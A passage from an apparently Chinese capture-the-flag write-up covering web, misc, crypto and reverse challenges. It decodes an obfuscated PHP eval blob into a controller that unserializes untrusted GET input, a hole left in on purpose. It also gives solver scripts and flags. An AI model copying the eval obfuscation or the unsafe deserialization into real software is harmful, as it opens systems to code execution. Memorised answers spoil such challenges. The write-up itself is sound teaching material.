UjFibTFuYmRFc05FR2pPVkdORkVaZVNOdVpjM1dLTm9ydEZvVnFpd0JpVlo1Y3NaUjFSVmpWR0VFeWhMaGZWc2hGaUJmclV3RUZORUdlc2lqTnMyU05pWkdOY3ZyQVZCVjRjRWpNVkxCR2MzV3ZPMmEwUjJWRUZvYWhjZGhhVm9heXB2aE5VQmtOVk5oMUdKVzBGRWpzaEJHVnAyYTNzMk00U05FSXptdWdiTFd2c0RFV2N2amRObzlnaExoYVZvYXlpdmhPUmRTaWNCa0xzaVcwYlZHSWlacnBiZFdrc0JHTWhFVEFWQldTVnNreUdFelRwMVNmaGlWWk5FamhHbUdORnMwclJkV0dWMWt5VkV6NHp2am5HdjFMVkJrbXNLanBWMW1BenYxTnAwNWNOb3JwaEVjS1ZCRXVic1Y1VnNWcEYxVUtoREdpYlpra09vMTRGRVNkR3Z1U2J2UzVzMXVFU05FRVZCV2lWMnJ2c0RFWnAxU2ZoaVZaTkVqaEdtR05GczByUmRXR1Yxa3lWRXo0enZFbUd2MUxWQmttc0tqcFYxbUF6djFOcDA1SE5CekZoRWNlTkJ6aGNkaGFWb2F5aXZoVnBkVnNORUdoc29yTk5CR01iRUVTYm1mMk8za2pTVkdFemR1WmgycmNzWlZNT1ZVZVNOcnBjZGg0TkRqdEZzMXFod0VpY0VqdE9WR05zRU9BaUJqU3BCanFzS1NaU29qRXp2MU5wMDVjR0VoWFIxa01iRXpoY2RoYVYyYXRpQlVBcEpHaXBLQmVzaVdOaVZWZFJka1NjMWprVkJoamNFbWVWQmhaaEVUMFZEajBVMUdOaFprWmJFR3BzaWp0YlZ6Tk5aaGljQmt1aURqcE5CR0lpWnJwYkVrbXNLanBWMW1laEJTVmhtanlPMmFUUlZjZU5aNVpjMDU1Tk5rTlNtMU5SbXJOYzBzMVYwVkFzb2h2c3dqVmh2dW5OVmhFU1ZzZXptak5wMGtlc1ZHQWkyRTZGd3VWTnZ1NU9va05TdlNhU0pFQkZtazFpQnVUUE5qbmJtQlZjM1dLc0tqcFYxbUF6SkVTaDN1SE5Cemh5c0JuenZyWmJzR0tGMFNEQzFXa08zVnRoS0UxVkRqVFZFU0pHMmFOYnZyT05pU1RwMGFKc291cGJFT2VWREVoYjBrZE5CU1ZiQmYwTkxCM3AyRUxzRFNnaGlFc0Yya2pSbXJKc291cGJFT2VWREVoYjBrZE5CU1ZiQmYwTkxCM3AyRUxzRFNnaGlFc2ltU0ZSRWtmR2RTc1ZaMUFpbVNGcEVrTVZEak5jVkVRRlp6cHMxVnFzRGhHUEx6M2ltU0ZSRWtmR2RTc1ZaMUFGMVNJUm05M0hpMGd0Rlo3SEs0PSI7ZXZhbCgnPz4nLiRhckNpQ0woJFZ2VXJCWigkREVvbUtrKCRWQ0JaUVcsJExucG52WSoyKSwkREVvbUtrKCRWQ0JaUVcsJExucG52WSwkTG5wbnZZKSwkREVvbUtrKCRWQ0JaUVcsMCwkTG5wbnZZKSkpKTs=&quot;));?&gt; 尝试手动逐层解密，最后得到： 1234567891011121314151617181920&lt;?phpnamespace app\\controller;use app\\BaseController;class Index extends BaseController&#123; public function index() &#123; if(!empty($_GET[&#x27;pop&#x27;]))&#123; unserialize(base64_decode($_GET[&#x27;pop&#x27;])); &#125; return &quot;Welcom To CAZT! Xi&#x27;an Come On!&quot;; &#125; public function C4zyC0m3On() &#123; return &#x27;cazy&#123;PHP_ji4m1_1s_s00000_3aSyyyyyyyyyyy&#125;&#x27;; &#125;&#125; ​ Ez_Stegzip压缩包根据提示爆破6位数字密码为 220101，解压有 steg.pyc 和 flag.txt。 用uncompyle6逆pyc发现无有意义代码，为pyc隐写，用stegosaurus工具解密： python stegosaurus.py steg.pyc -x 得到密码 Extracted payload: TheKey:St3g1sV3ryFuNny。 再将 flag.txt 中emoji密文用emoji-aes解得到flag：cazy&#123;Em0j1s_AES_4nd_PyC_St3g_D0_yoU_l1ke&#125; ​ binary 二进制 文件头 CAFEBABE 说明为 .class Java字节码文件，用jadx查看： 12345678package defpackage;/* renamed from: Main reason: default package */public class Main &#123; public static void main(String[] strArr) &#123; byte[] bArr = &#123;77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 86, 120, 117, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 70, 120, 117, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 65, 120, 77, 70, 120, 117, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 70, 120, 117, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 65, 120, 77, 68, 65, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 86, 120, 117, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 70, 120, 117, 77, 68, 69, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 119, 77, 70, 120, 117, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 65, 120, 77, 84, 65, 120, 77, 70, 120, 117, 77, 68, 65, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 68, 69, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 86, 120, 117, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 120, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 84, 69, 119, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 86, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 69, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 65, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 65, 61, 61&#125;; &#125;&#125; 10进制转字符串，base64解码得到： 0000000101110000000011111101110000000\\n0111110101101010111110001110110111110\\n0100010100001111000111010110110100010\\n0100010110000011000111000001010100010\\n0100010111011011001101101011110100010\\n0111110101110100000001001000010111110\\n0000000101010101010101010101010000000\\n1111111100100000000100110011111111111\\n1100010101010000101111110100000011000\\n0101101000110010010000100110101011101\\n1011000001001111001100011010000010010\\n1110111111110010101101000110101011100\\n1010110001110000000110100000000000010\\n0110101001000100011011101011101111101\\n0010100100111111101110000110010100010\\n0010001101110110110011001100110011101\\n1110100110001111111011010011000000010\\n0000111010100011100000101101111110111\\n1101100110101101001100010100110000100\\n0101001001111001000001001110010010111\\n0101010011000111000110010000010101000\\n1001101111101110110010011111101011101\\n1101100010111000000101110110001011010\\n0011001000111101100011110100100111101\\n0101000001110101110110101111110100010\\n0101011011001001000000110100010011111\\n0110100010001110010110011011111001100\\n0111001111100000010110110111001111100\\n0100110010110010100010111011000000000\\n1111111101011001110011100101011101011\\n0000000111000111011010110001010100100\\n0111110111001101010110101100011101111\\n0100010100110000110011010000000000010\\n0100010101111101100011111111110100111\\n0100010101101111111100000010101010110\\n0111110111111000101101001111000110110\\n0000000111111011110110000000100011000 37*37的01字符串，转为二维码： 123456789101112s=&#x27;0000000101110000000011111101110000000011111010110101011111000111011011111001000101000011110001110101101101000100100010110000011000111000001010100010010001011101101100110110101111010001001111101011101000000010010000101111100000000101010101010101010101010000000111111110010000000010011001111111111111000101010100001011111101000000110000101101000110010010000100110101011101101100000100111100110001101000001001011101111111100101011010001101010111001010110001110000000110100000000000010011010100100010001101110101110111110100101001001111111011100001100101000100010001101110110110011001100110011101111010011000111111101101001100000001000001110101000111000001011011111101111101100110101101001100010100110000100010100100111100100000100111001001011101010100110001110001100100000101010001001101111101110110010011111101011101110110001011100000010111011000101101000110010001111011000111101001001111010101000001110101110110101111110100010010101101100100100000011010001001111101101000100011100101100110111110011000111001111100000010110110111001111100010011001011001010001011101100000000011111111010110011100111001010111010110000000111000111011010110001010100100011111011100110101011010110001110111101000101001100001100110100000000000100100010101111101100011111111110100111010001010110111111110000001010101011001111101111110001011010011110001101100000000111111011110110000000100011000&#x27;from PIL import Imageimg = Image.new(&#x27;RGB&#x27;,(37,37))width , height = img.sizefor i in range(0,width): for j in range(0,height): if s[37*i+j]==&#x27;0&#x27;: img.putpixel((i,j),(0,0,0)) else: img.putpixel((i,j),(255,255,255))img.save(&#x27;out.png&#x27;) 扫码得flag：flag&#123;932b2c0070e4897ea7df0190dbf36ece&#125; ​ CRYPTOLinearEquations 123456789101112131415161718192021222324252627282930313233from Crypto.Util.number import*from secret import flagassert flag[:5] == b&#x27;cazy&#123;&#x27;assert flag[-1:] == b&#x27;&#125;&#x27;flag = flag[5:-1]assert(len(flag) == 24)class my_LCG: def __init__(self, seed1 , seed2): self.state = [seed1,seed2] self.n = getPrime(64) while 1: self.a = bytes_to_long(flag[:8]) self.b = bytes_to_long(flag[8:16]) self.c = bytes_to_long(flag[16:]) if self.a &lt; self.n and self.b &lt; self.n and self.c &lt; self.n: break def next(self): new = (self.a * self.state[-1] + self.b * self.state[-2] + self.c) % self.n self.state.append( new ) return newdef main(): lcg = my_LCG(getRandomInteger(64),getRandomInteger(64)) print(&quot;data = &quot; + str([lcg.next() for _ in range(5)])) print(&quot;n = &quot; + str(lcg.n))if __name__ == &quot;__main__&quot;: main() # data = [2626199569775466793, 8922951687182166500, 454458498974504742, 7289424376539417914, 8673638837300855396]# n = 10104483468358610819 魔改三参数LCG，利用满足的公式 $as_{i-1}+bs_{i-2}+c \\equiv s_i \\pmod n$，得到三元一次同余方程组，利用Gröbner基求解： 1234567891011121314151617d = [2626199569775466793, 8922951687182166500, 454458498974504742, 7289424376539417914, 8673638837300855396]n = 10104483468358610819PR.&lt;a,b,c&gt; = PolynomialRing(Zmod(n))f1 = (a*d[1]+b*d[0]+c-d[2])f2 = (a*d[2]+b*d[1]+c-d[3])f3 = (a*d[3]+b*d[2]+c-d[4])Fs = [f1, f2, f3]I = Ideal(Fs)B = I.groebner_basis()m = b&#x27;&#x27;for b in B: assert b.degree() == 1 mi = ZZ(-b(0, 0, 0)) m += bytes.fromhex(hex(mi)[2:])print(m)# b&#x27;L1near_Equ4t1on6_1s_34sy&#x27; 拼接：cazy&#123;L1near_Equ4t1on6_1s_34sy&#125; ​ no_can_no_bb 123456789101112131415161718192021import randomfrom Crypto.Util.number import long_to_bytesfrom Crypto.Cipher import AESfrom secret import flagassert flag[:5] ==b&#x27;cazy&#123;&#x27;def pad(m): tmp = 16-(len(m)%16) return m + bytes([tmp for _ in range(tmp)])def encrypt(m,key): aes = AES.new(key,AES.MODE_ECB) return aes.encrypt(m)if __name__ == &quot;__main__&quot;: flag = pad(flag) key = pad(long_to_bytes(random.randrange(1,1&lt;&lt;20))) c = encrypt(flag,key) print(c)# b&#x27;\\x9d\\x18K\\x84n\\xb8b|\\x18\\xad4\\xc6\\xfc\\xec\\xfe\\x14\\x0b_T\\xe3\\x1b\\x03Q\\x96e\\x9e\\xb8MQ\\xd5\\xc3\\x1c&#x27; random范围不大，爆破key解AES-ECB： 1234567891011121314151617181920from Crypto.Util.number import long_to_bytesfrom Crypto.Cipher import AESdef pad(x): tmp = 16-(len(x)%16) return x + bytes([tmp for _ in range(tmp)])def decrypt(c,key): aes = AES.new(key,AES.MODE_ECB) return aes.decrypt(c)if __name__ == &quot;__main__&quot;: for i in range(1&lt;&lt;20): key = pad(long_to_bytes(i)) c = b&#x27;\\x9d\\x18K\\x84n\\xb8b|\\x18\\xad4\\xc6\\xfc\\xec\\xfe\\x14\\x0b_T\\xe3\\x1b\\x03Q\\x96e\\x9e\\xb8MQ\\xd5\\xc3\\x1c&#x27; m = decrypt(c,key) if m.startswith(b&#x27;cazy&#123;&#x27;): print(m) # b&#x27;cazy&#123;n0_c4n,bb?n0p3!&#125;\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b&#x27; ​ no_cry_no_can 1234567891011121314from Crypto.Util.number import*from secret import flag,keyassert len(key) &lt;= 5assert flag[:5] == b&#x27;cazy&#123;&#x27;def can_encrypt(flag,key): block_len = len(flag) // len(key) + 1 new_key = key * block_len return bytes([i^j for i,j in zip(flag,new_key)])c = can_encrypt(flag,key)print(c)# b&#x27;&lt;pH\\x86\\x1a&amp;&quot;m\\xce\\x12\\x00pm\\x97U1uA\\xcf\\x0c:NP\\xcf\\x18~l&#x27; key为5位，已知flag头5位，与密文异或得key = b&#39;\\x5f\\x11\\x32\\xff\\x61&#39;，再异或密文还原明文： cazy&#123;y3_1s_a_h4nds0me_b0y!&#125; ​ no_math_no_cry 123456789101112131415from Crypto.Util.number import*from secret import flagassert len(flag) &lt;= 80def sec_encry(m): cip = (m - (1&lt;&lt;500))**2 + 0x0338470 return cipif __name__ == &quot;__main__&quot;: m = bytes_to_long(flag) c = sec_encry(m) print(c)# 10715086071862673209484250490600018105614048117055336074437503883703510511248211671489145400471130049712947188505612184220711949974689275316345656079538583389095869818942817127245278601695124271626668045250476877726638182396614587807925457735428719972874944279172128411500209111406507112585996098530169 简单逆回去就好，注意一下开方取负值： 1234567c = 10715086071862673209484250490600018105614048117055336074437503883703510511248211671489145400471130049712947188505612184220711949974689275316345656079538583389095869818942817127245278601695124271626668045250476877726638182396614587807925457735428719972874944279172128411500209111406507112585996098530169c -= 0x0338470import gmpy2m = -gmpy2.iroot(c,2)[0]print(bytes.fromhex(hex(m+(1&lt;&lt;500))[2:]))# b&#x27;cazy&#123;1234567890_no_m4th_n0_cRy&#125;&#x27; ​ math 数学最重要的就是推导 12345pinvq:0x63367a2b947c21d5051144d2d40572e366e19e3539a3074a433a92161465543157854669134c03642a12d304d2d9036e6458fe4c850c772c19c4eb3f567902b3qinvp:0x79388eb6c541fffefc9cfb083f3662655651502d81ccc00ecde17a75f316bc97a8d888286f21b1235bde1f35efe13f8b3edb739c8f28e6e6043cb29569aa0e7bc:0x5a1e001edd22964dd501eac6071091027db7665e5355426e1fa0c6360accbc013c7a36da88797de1960a6e9f1cf9ad9b8fd837b76fea7e11eac30a898c7a8b6d8c8989db07c2d80b14487a167c0064442e1fb9fd657a519cac5651457d64223baa30d8b7689d22f5f3795659ba50fb808b1863b344d8a8753b60bb4188b5e386e:0x10005d:0xae285803302de933cfc181bd4b9ab2ae09d1991509cb165aa1650bef78a8b23548bb17175f10cddffcde1a1cf36417cc080a622a1f8c64deb6d16667851942375670c50c5a32796545784f0bbcfdf2c0629a3d4f8e1a8a683f2aa63971f8e126c2ef75e08f56d16e1ec492cf9d26e730eae4d1a3fecbbb5db81e74d5195f49f1 给出 $x=\\text{inv}(p,q),y=\\text{inv}(q,p),e,d,c$。 详细推导思路可参考 HITCON 2019 - Lost Modulus Again。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677import gmpy2from itertools import productimport binasciifrom Crypto.Util.number import *&quot;&quot;&quot;alpha = p&#x27; * q&#x27; - lbeta = l^2 * [(e * d - 1) / s] + q&#x27; * l + p&#x27; * l - p&#x27; * q&#x27; - alpha - l^2i.e.:beta = l^2 * &#123;[(e * d - 1) / s] - 1&#125; + l * (q&#x27; + p&#x27;) - alpha - p&#x27; * q&#x27;if l,s are correct: alpha = k * t beta = k * (p&#x27; - l) + t * (q&#x27; - l)i.e:&quot;&quot;&quot;def alpha_from_pprime_qprime_l(pprime, qprime, l): return pprime*qprime - ldef beta_from_pprime_qprime_e_d_l_s_alpha(pprime, qprime, e, d, l, s, alpha): temp1 = e*d - 1 assert temp1 % s == 0 temp2 = ((temp1 // s) - 1) * l * l temp3 = temp2 + l * (pprime + qprime) return temp3 - alpha - (pprime*qprime)def k_t_from_pprime_qprime_l_alpha_beta(pprime, qprime, l, alpha, beta): a = pprime - l b = -beta c = alpha * (qprime - l) disc = b * b - 4 * a * c assert gmpy2.is_square(disc) temp = -b + gmpy2.isqrt(disc) assert temp % (2*a) == 0 k = temp // (2*a) assert alpha % k == 0 return k, alpha // kdef brute_k_t_l(pprime, qprime, e, d): # l, s = 2, 2 ss = [s for s in range(e - 100000, e + 1000000) if s!=0 and (e*d - 1) % s == 0] for l, s in product(range(1, 5000), ss): #print(f&#x27;l = &#123;l&#125;, s = &#123;s&#125;&#x27;) try: alpha = alpha_from_pprime_qprime_l(pprime, qprime, l) beta = beta_from_pprime_qprime_e_d_l_s_alpha(pprime, qprime, e, d, l, s, alpha) k, t = k_t_from_pprime_qprime_l_alpha_beta(pprime, qprime, l, alpha, beta) return k, t, l except AssertionError: continueif __name__ == &quot;__main__&quot;: e = 0x10005 #fn = 15743369066365201538689815141217340316571238013087670610561037355773525976258683589473338312326667266426637983360891507450086948913791067841805124377899989037485326133436719169246977060981737084689604571176180431464103979969894191079926052092838806338413905561857239072404009236751128582547515118141940600672935405990869984053032765764114050729270669601890847900632843688927485888918612911073502700067125045327489296133801029104137634700096205588495179191062622618039322093662364377472003903899926787818853067801269953347284657645644433840226628368651915623156258190141632506503179281547840336415021260912890513317032 d = 0xae285803302de933cfc181bd4b9ab2ae09d1991509cb165aa1650bef78a8b23548bb17175f10cddffcde1a1cf36417cc080a622a1f8c64deb6d16667851942375670c50c5a32796545784f0bbcfdf2c0629a3d4f8e1a8a683f2aa63971f8e126c2ef75e08f56d16e1ec492cf9d26e730eae4d1a3fecbbb5db81e74d5195f49f1 pprime = 0x63367a2b947c21d5051144d2d40572e366e19e3539a3074a433a92161465543157854669134c03642a12d304d2d9036e6458fe4c850c772c19c4eb3f567902b3 qprime = 0x79388eb6c541fffefc9cfb083f3662655651502d81ccc00ecde17a75f316bc97a8d888286f21b1235bde1f35efe13f8b3edb739c8f28e6e6043cb29569aa0e7b k, t, l = brute_k_t_l(pprime, qprime, e, d) lp, lq = qprime + k, pprime + t assert lp % l == 0, lq % l == 0 p, q = lp // l, lq // l assert gmpy2.invert(p, q) == pprime, gmpy2.invert(q, p) == qprime assert gmpy2.is_prime(p), gmpy2.is_prime(q) N = p*q c = 0x5a1e001edd22964dd501eac6071091027db7665e5355426e1fa0c6360accbc013c7a36da88797de1960a6e9f1cf9ad9b8fd837b76fea7e11eac30a898c7a8b6d8c8989db07c2d80b14487a167c0064442e1fb9fd657a519cac5651457d64223baa30d8b7689d22f5f3795659ba50fb808b1863b344d8a8753b60bb4188b5e386 flag_decoded = pow(c, d, N) print(long_to_bytes(flag_decoded)) # b&#x27;flag&#123;c4617a206ba83d7f824dc44e5e67196a&#125;&#x27; ​ REVERSElemon re签到题，格式：flag{output} 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781790: const 60 ; &lt;module &#x27;main&#x27;&gt; 5: module 9 59211: const 26 ; 83 16: const 27 ; 69 21: const 28 ; 65 26: array 331: store 0 034: const 30 ; 101 39: const 31 ; 108 44: const 32 ; 111 49: const 33 ; 117 54: const 34 ; 122 59: const 30 ; 101 64: const 35 ; 105 69: const 36 ; 98 74: const 30 ; 101 79: const 31 ; 108 84: const 33 ; 117 89: const 35 ; 105 94: const 37 ; 113 99: const 33 ; 117 104: const 35 ; 105 109: const 37 ; 113 114: array 16119: store 0 1122: const 39 ; 0 127: store 0 2130: array 0135: store 0 3138: load 0 2141: const 42 ; 256 146: lt147: jz 184152: load 0 3155: const 43 ; append 160: getattr161: load 0 2164: call 1166: pop167: load 0 2170: const 44 ; 1 175: add176: store 0 2179: jmp 138184: const 39 ; 0 189: store 0 4192: load 0 4195: const 42 ; 256 200: lt201: jz 271206: load 0 3209: load 0 4212: getitem213: load 0 0216: load 0 4219: const 46 ; 3 224: mod225: getitem226: add227: load 0 1230: load 0 4233: const 47 ; 16 238: mod239: getitem240: add241: const 42 ; 256 246: mod247: load 0 3250: load 0 4253: setitem254: load 0 4257: const 44 ; 1 262: add263: store 0 4266: jmp 192271: const 39 ; 0 276: store 0 5279: load 0 5282: const 46 ; 3 287: lt288: jz 448293: 